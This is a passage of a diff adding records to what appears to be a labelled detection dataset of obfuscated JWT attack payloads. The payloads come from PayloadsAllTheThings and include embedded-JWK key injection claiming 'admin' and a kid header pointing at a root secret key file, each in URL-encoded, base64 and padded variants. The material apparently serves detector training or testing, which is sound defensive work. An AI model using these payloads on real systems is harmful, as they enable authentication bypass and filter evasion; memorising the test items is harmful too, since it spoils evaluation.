+    "original_payload": "{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\n  }\n}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key injected]",
+    "obfuscated_payload": "%7B%0A%20%20%22alg%22%3A%20%22RS256%22%2C%0A%20%20%22typ%22%3A%20%22JWT%22%2C%0A%20%20%22jwk%22%3A%20%7B%0A%20%20%20%20%22kty%22%3A%20%22RSA%22%2C%0A%20%20%20%20%22kid%22%3A%20%22jwt_tool%22%2C%0A%20%20%20%20%22use%22%3A%20%22sig%22%2C%0A%20%20%20%20%22e%22%3A%20%22AQAB%22%2C%0A%20%20%20%20%22n%22%3A%20%22uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw%22%0A%20%20%7D%0A%7D.%0A%7B%22login%22%3A%22admin%22%7D.%0A%5BSigned%20with%20new%20Private%20key%3B%20Public%20key%20injected%5D",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65463076,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00006__obf02",
+    "payload": "ewogICJhbGciOiAiUlMyNTYiLAogICJ0eXAiOiAiSldUIiwKICAiandrIjogewogICAgImt0eSI6ICJSU0EiLAogICAgImtpZCI6ICJqd3RfdG9vbCIsCiAgICAidXNlIjogInNpZyIsCiAgICAiZSI6ICJBUUFCIiwKICAgICJuIjogInVLQkdpd1lxcHFQemJLNl9meUVwNzFIM29XcVlYbkdKazlURzN5OUtfdVlobEdrSkhtTVNrbTc4UFdTaVp6Vmg3WmowU0ZKdU5GdEdjdXlROVZvWjNtM0FHSjZwSjVQaVVEREhMYnR5Wjl4Z0pIUGRJX2drR1RtVDAyUmZ1OU1pZlAteHoyWlJ2dmdzV3pUUGtpUG4tX2NGSEt0elE0YjhUM3cxdnN3VGFJUzhiamdRMkdCcXAwaEh6VEJHTjI2eklVMDhXQ2xRMUdxNExzS2dOS1RqZFlMc2YwZTl0ZER0OFBlNS1LS1dqbW5saGVrenBfbm5iNEMyRE1wRWMxaVZEbWRIVjJfRE9wZi1rSF8xbnl1Q1M5X01uSnB0RjFORHRMX2xMVXlqeVdpTHp2TFlVc2hBeUFXNktPUnBHdm8yd0phMlNselZ0elZQbWZnR1c3Q2hwdyIKICB9Cn0uCnsibG9naW4iOiJhZG1pbiJ9LgpbU2lnbmVkIHdpdGggbmV3IFByaXZhdGUga2V5OyBQdWJsaWMga2V5IGluamVjdGVkXQ",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ee32f26808449c6d6c0218e684d256d962f8eb777226628902d3a7911c187c36",
+    "original_id": "raw_jwt_00006",
+    "original_payload": "{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\n  }\n}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key injected]",
+    "obfuscated_payload": "ewogICJhbGciOiAiUlMyNTYiLAogICJ0eXAiOiAiSldUIiwKICAiandrIjogewogICAgImt0eSI6ICJSU0EiLAogICAgImtpZCI6ICJqd3RfdG9vbCIsCiAgICAidXNlIjogInNpZyIsCiAgICAiZSI6ICJBUUFCIiwKICAgICJuIjogInVLQkdpd1lxcHFQemJLNl9meUVwNzFIM29XcVlYbkdKazlURzN5OUtfdVlobEdrSkhtTVNrbTc4UFdTaVp6Vmg3WmowU0ZKdU5GdEdjdXlROVZvWjNtM0FHSjZwSjVQaVVEREhMYnR5Wjl4Z0pIUGRJX2drR1RtVDAyUmZ1OU1pZlAteHoyWlJ2dmdzV3pUUGtpUG4tX2NGSEt0elE0YjhUM3cxdnN3VGFJUzhiamdRMkdCcXAwaEh6VEJHTjI2eklVMDhXQ2xRMUdxNExzS2dOS1RqZFlMc2YwZTl0ZER0OFBlNS1LS1dqbW5saGVrenBfbm5iNEMyRE1wRWMxaVZEbWRIVjJfRE9wZi1rSF8xbnl1Q1M5X01uSnB0RjFORHRMX2xMVXlqeVdpTHp2TFlVc2hBeUFXNktPUnBHdm8yd0phMlNselZ0elZQbWZnR1c3Q2hwdyIKICB9Cn0uCnsibG9naW4iOiJhZG1pbiJ9LgpbU2lnbmVkIHdpdGggbmV3IFByaXZhdGUga2V5OyBQdWJsaWMga2V5IGluamVjdGVkXQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 65464085,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00006__obf03",
+    "payload": "{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\n  }\n}==.\n{\"login\":\"admin\"}==.\n[Signed with new Private key; Public key injected]=",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ee32f26808449c6d6c0218e684d256d962f8eb777226628902d3a7911c187c36",
+    "original_id": "raw_jwt_00006",
+    "original_payload": "{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\n  }\n}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key injected]",
+    "obfuscated_payload": "{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\n  }\n}==.\n{\"login\":\"admin\"}==.\n[Signed with new Private key; Public key injected]=",
+    "obfuscation_chain": [
+      "jwt_padding"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 65465094,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_jwt_00006__obf04",
+    "payload": "{\n  \"alg\": \"RS%3256\",\n  \"ty%70\": \"%4AW%54\",\n  \"jwk\": {\n    \"%6Bty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGi%77Yq%70%71P%7A%62K6_fy%45p71H3o%57qYXnGJk9TG3y9%4B_uYhl%47%6BJHm%4DSkm7%38%50%57SiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m%33AG%4A%36p%4A%35%50i%55DDHLbtyZ9xg%4AHPdI%5Fg%6BG%54mT%302Rfu9%4DifP-x%7A2Z%52%76v%67sWzTPkiPn-_cFHKtzQ4b8%54%33w1vswTa%49%538%62jgQ%32%47Bq%700%68Hz%54BGN%32%36zIU0%38WC%6CQ1Gq4%4CsK%67NKTj%64YLsf0e%39td%44t8Pe5-KKWj%6Dnlh%65kzp%5Fnn%62%34C%32D%4DpEc%31%69VD%6DdHV2_D%4Fpf-k%48_1nyu%43S9_MnJ%70%74F1NDtL_%6CLUyjyWiLzvL%59%55shAyAW6KORpGvo2%77Ja%32Sl%7AVtzVPmfgGW%37Chpw\"\n  }\n}.\n{\"login\":\"adm%69%6E\"}.\n[Signed wi%74h %6Eew P%72ivate %6Bey; Publi%63 ke%79 inje%63ted]",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ee32f26808449c6d6c0218e684d256d962f8eb777226628902d3a7911c187c36",
+    "original_id": "raw_jwt_00006",
+    "original_payload": "{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\n  }\n}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key injected]",
+    "obfuscated_payload": "{\n  \"alg\": \"RS%3256\",\n  \"ty%70\": \"%4AW%54\",\n  \"jwk\": {\n    \"%6Bty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGi%77Yq%70%71P%7A%62K6_fy%45p71H3o%57qYXnGJk9TG3y9%4B_uYhl%47%6BJHm%4DSkm7%38%50%57SiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m%33AG%4A%36p%4A%35%50i%55DDHLbtyZ9xg%4AHPdI%5Fg%6BG%54mT%302Rfu9%4DifP-x%7A2Z%52%76v%67sWzTPkiPn-_cFHKtzQ4b8%54%33w1vswTa%49%538%62jgQ%32%47Bq%700%68Hz%54BGN%32%36zIU0%38WC%6CQ1Gq4%4CsK%67NKTj%64YLsf0e%39td%44t8Pe5-KKWj%6Dnlh%65kzp%5Fnn%62%34C%32D%4DpEc%31%69VD%6DdHV2_D%4Fpf-k%48_1nyu%43S9_MnJ%70%74F1NDtL_%6CLUyjyWiLzvL%59%55shAyAW6KORpGvo2%77Ja%32Sl%7AVtzVPmfgGW%37Chpw\"\n  }\n}.\n{\"login\":\"adm%69%6E\"}.\n[Signed wi%74h %6Eew P%72ivate %6Bey; Publi%63 ke%79 inje%63ted]",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65466103,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00007__obf01",
+    "payload": "%22alg%22%3A%20%22RS256%22%2C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "90825ed283916896f93a912b5defed8c0849c38a6fc893608fab23aa4bdcb846",
+    "original_id": "raw_jwt_00007",
+    "original_payload": "\"alg\": \"RS256\",",
+    "obfuscated_payload": "%22alg%22%3A%20%22RS256%22%2C",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65563079,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00007__obf02",
+    "payload": "ImFsZyI6ICJSUzI1NiIs",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "90825ed283916896f93a912b5defed8c0849c38a6fc893608fab23aa4bdcb846",
+    "original_id": "raw_jwt_00007",
+    "original_payload": "\"alg\": \"RS256\",",
+    "obfuscated_payload": "ImFsZyI6ICJSUzI1NiIs",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 65564088,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00007__obf03",
+    "payload": "\"al%67\": \"%52S%325%36\",",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "90825ed283916896f93a912b5defed8c0849c38a6fc893608fab23aa4bdcb846",
+    "original_id": "raw_jwt_00007",
+    "original_payload": "\"alg\": \"RS256\",",
+    "obfuscated_payload": "\"al%67\": \"%52S%325%36\",",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65565097,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00007__obf04",
+    "payload": "%22a%256Cg%22%3A%20%22RS256%22%2C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "90825ed283916896f93a912b5defed8c0849c38a6fc893608fab23aa4bdcb846",
+    "original_id": "raw_jwt_00007",
+    "original_payload": "\"alg\": \"RS256\",",
+    "obfuscated_payload": "%22a%256Cg%22%3A%20%22RS256%22%2C",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65566106,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00008__obf01",
+    "payload": "%22kid%22%3A%20%22jwt_tool%22%2C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "9cfd4a23fbd439f778822cf14244a2c8c582eabea7c9878abc4b6a493fa19660",
+    "original_id": "raw_jwt_00008",
+    "original_payload": "\"kid\": \"jwt_tool\",",
+    "obfuscated_payload": "%22kid%22%3A%20%22jwt_tool%22%2C",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65663082,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00008__obf02",
+    "payload": "ImtpZCI6ICJqd3RfdG9vbCIs",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "9cfd4a23fbd439f778822cf14244a2c8c582eabea7c9878abc4b6a493fa19660",
+    "original_id": "raw_jwt_00008",
+    "original_payload": "\"kid\": \"jwt_tool\",",
+    "obfuscated_payload": "ImtpZCI6ICJqd3RfdG9vbCIs",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 65664091,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00008__obf03",
+    "payload": "\"%6B%69d\": \"%6Aw%74_%74ool\",",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "9cfd4a23fbd439f778822cf14244a2c8c582eabea7c9878abc4b6a493fa19660",
+    "original_id": "raw_jwt_00008",
+    "original_payload": "\"kid\": \"jwt_tool\",",
+    "obfuscated_payload": "\"%6B%69d\": \"%6Aw%74_%74ool\",",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65665100,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00008__obf04",
+    "payload": "%2522kid%2522%253A%2520%2522jwt_tool%2522%252C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "9cfd4a23fbd439f778822cf14244a2c8c582eabea7c9878abc4b6a493fa19660",
+    "original_id": "raw_jwt_00008",
+    "original_payload": "\"kid\": \"jwt_tool\",",
+    "obfuscated_payload": "%2522kid%2522%253A%2520%2522jwt_tool%2522%252C",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 65666109,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00009__obf01",
+    "payload": "{%0A  %20%20\"alg\"%3A %22HS256%22%2C%0A %20  %22typ%22%3A %22JWT%22,%0A%20   %22kid%22:%20%22/root%2Fres%2Fkeys%2Fsecret.key%22\n%20%20%20%20}",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "414ccaf1b8df29dfd72e8cf7934f2032fc153ef64f9b21d28a30e3b8afd97e48",
+    "original_id": "raw_jwt_00009",
+    "original_payload": "{\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\",\n    \"kid\": \"/root/res/keys/secret.key\"\n    }",
+    "obfuscated_payload": "{%0A  %20%20\"alg\"%3A %22HS256%22%2C%0A %20  %22typ%22%3A %22JWT%22,%0A%20   %22kid%22:%20%22/root%2Fres%2Fkeys%2Fsecret.key%22\n%20%20%20%20}",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65763085,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00009__obf02",
+    "payload": "ewogICAgImFsZyI6ICJIUzI1NiIsCiAgICAidHlwIjogIkpXVCIsCiAgICAia2lkIjogIi9yb290L3Jlcy9rZXlzL3NlY3JldC5rZXkiCiAgICB9",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "414ccaf1b8df29dfd72e8cf7934f2032fc153ef64f9b21d28a30e3b8afd97e48",
+    "original_id": "raw_jwt_00009",
+    "original_payload": "{\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\",\n    \"kid\": \"/root/res/keys/secret.key\"\n    }",
+    "obfuscated_payload": "ewogICAgImFsZyI6ICJIUzI1NiIsCiAgICAidHlwIjogIkpXVCIsCiAgICAia2lkIjogIi9yb290L3Jlcy9rZXlzL3NlY3JldC5rZXkiCiAgICB9",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 65764094,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00009__obf03",
+    "payload": "{\n    \"alg\": \"%48%53%32%356\",\n    \"%74yp\": \"JWT\",\n    \"kid\": \"/root/r%65s/keys/%73ecret.k%65y\"\n    }",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "414ccaf1b8df29dfd72e8cf7934f2032fc153ef64f9b21d28a30e3b8afd97e48",
+    "original_id": "raw_jwt_00009",
+    "original_payload": "{\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\",\n    \"kid\": \"/root/res/keys/secret.key\"\n    }",
+    "obfuscated_payload": "{\n    \"alg\": \"%48%53%32%356\",\n    \"%74yp\": \"JWT\",\n    \"kid\": \"/root/r%65s/keys/%73ecret.k%65y\"\n    }",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65765103,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00009__obf04",
+    "payload": "ewogICAgImFsZyI6ICJIUzI1NiIsCiAgICAidHlwIjogIkpXVCIsCiAgICAia2lkIjogIi9yb290L3JlJTczL2slNjV5JTczLyU3M2VjcmV0LmtleSIKICAgIH0",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "414ccaf1b8df29dfd72e8cf7934f2032fc153ef64f9b21d28a30e3b8afd97e48",
+    "original_id": "raw_jwt_00009",
+    "original_payload": "{\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\",\n    \"kid\": \"/root/res/keys/secret.key\"\n    }",
+    "obfuscated_payload": "ewogICAgImFsZyI6ICJIUzI1NiIsCiAgICAidHlwIjogIkpXVCIsCiAgICAia2lkIjogIi9yb290L3JlJTczL2slNjV5JTczLyU3M2VjcmV0LmtleSIKICAgIH0",
